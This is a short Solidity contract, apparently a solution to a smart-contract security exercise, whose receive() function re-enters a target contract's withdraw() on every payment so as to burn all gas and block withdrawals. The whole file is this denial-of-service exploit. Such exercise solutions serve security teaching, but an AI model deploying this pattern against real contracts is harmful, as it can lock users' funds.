// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    //Code me! reentrancy attack to withdraw until contract runs out of gas
    receive() external payable{
        if(contractAddress.balance >= 0) {
            Denial(contractAddress).withdraw();
        }
    }
}
